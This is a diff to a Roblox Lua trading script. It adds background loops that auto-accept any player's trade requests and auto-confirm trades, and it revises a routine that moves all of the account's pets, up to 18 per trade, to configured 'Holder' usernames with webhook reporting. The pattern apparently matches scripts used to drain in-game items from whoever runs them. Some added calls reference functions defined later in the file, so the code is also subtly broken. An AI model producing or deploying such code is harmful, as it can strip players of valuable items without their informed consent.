@@ -93,6 +93,55 @@ local function sendWebhook(message)
     end)
 end
 
+-- Auto-accept incoming trade requests
+local function setup_auto_accept()
+    task.spawn(function()
+        local dialogApp = LocalPlayer.PlayerGui:FindFirstChild("DialogApp")
+        
+        while task.wait(0.3) do
+            pcall(function()
+                if dialogApp and dialogApp:FindFirstChild("Dialog") and dialogApp.Dialog.Visible then
+                    -- Auto-accept ANY incoming trade request
+                    for _, player in pairs(Players:GetPlayers()) do
+                        if player.Name ~= playerName then
+                            ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(player, true)
+                            print("✅ Auto-accepted trade from " .. player.Name)
+                        end
+                    end
+                end
+            end)
+        end
+    end)
+end
+
+-- Auto-accept negotiations in trade window
+local function setup_auto_negotiate()
+    task.spawn(function()
+        while task.wait(0.5) do
+            pcall(function()
+                local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeApp")
+                if tradeGui and tradeGui.Frame.Visible then
+                    first_trade_accept()
+                end
+            end)
+        end
+    end)
+end
+
+-- Auto-confirm trades
+local function setup_auto_confirm()
+    task.spawn(function()
+        while task.wait(0.5) do
+            pcall(function()
+                local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeApp")
+                if tradeGui and tradeGui.Frame.Visible then
+                    confirm_trade()
+                end
+            end)
+        end
+    end)
+end
+
 -- Trade functions
 local function first_trade_accept()
     ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()
@@ -170,6 +219,8 @@ local function autotrade(username)
         return true
     end
     
+    local success_flag = false
+    
     pcall(function()
         trade_status = true
         
@@ -181,6 +232,7 @@ local function autotrade(username)
         
         -- Send trade request
         if not send_trade(username) then
+            print("❌ Failed to send trade request")
             trade_status = false
             return false
         end
@@ -202,6 +254,7 @@ local function autotrade(username)
         end
         
         print("✅ Trade window opened")
+        task.wait(1) -- Wait for window to fully load
         
         -- Add pets (max 18 per trade)
         local pets_to_add = math.min(#pets_unique_ids, 18)
@@ -216,21 +269,25 @@ local function autotrade(username)
         end
         
         print("✅ All pets added to trade")
-        task.wait(1.5)
+        task.wait(2) -- Wait for pets to appear in trade window
+        
+        -- Wait for 6-second countdown
+        print("⏱️ Waiting for 6-second countdown...")
+        task.wait(6)
         
         -- Accept trade
+        print("✅ Clicking accept...")
         first_trade_accept()
-        print("✅ Trade accepted")
-        task.wait(1.5)
+        task.wait(1)
         
-        -- Confirm trade
+        -- Confirm trade (instant)
+        print("✅ Confirming trade...")
         confirm_trade()
-        print("✅ Trade confirmed")
         
-        -- Wait for trade to ACTUALLY close (increased timeout)
+        -- Wait for trade to ACTUALLY close
         print("⏳ Waiting for trade to complete...")
         timeout = 0
-        local max_wait = 30 -- 30 seconds max
+        local max_wait = 30
         
         while tradeGui.Visible and timeout < max_wait do
             task.wait(0.5)
@@ -261,16 +318,18 @@ local function autotrade(username)
                 table.remove(pets_unique_ids, 1)
             end
             print(string.format("📋 Remaining pets to trade: %d", #pets_unique_ids))
+            success_flag = true
         else
             warn("⚠️ No pets were actually traded! Possible trade failure")
             -- Refresh pet list in case
             pets_unique_ids = get_all_pets()
+            success_flag = false
         end
         
         trade_status = false
     end)
     
-    return true
+    return success_flag
 end
 
 -- Main execution
@@ -278,6 +337,13 @@ print(string.format("\n📋 Configuration:"))
 print(string.format("   • Holder: %s", table.concat(config.usernames, ", ")))
 print(string.format("   • Pet Kinds: %s", table.concat(config.pets_to_trade, ", ")))
 print(string.format("   • Webhook: %s\n", config.Webhook ~= "" and "Enabled" or "Disabled"))
+
+-- Start auto-accept systems
+print("🤖 Starting auto-accept systems...")
+setup_auto_accept()
+setup_auto_negotiate()
+setup_auto_confirm()
+print("✅ Auto-accept enabled for all trade stages\n")
 
 local totalPetsTraded = 0
 
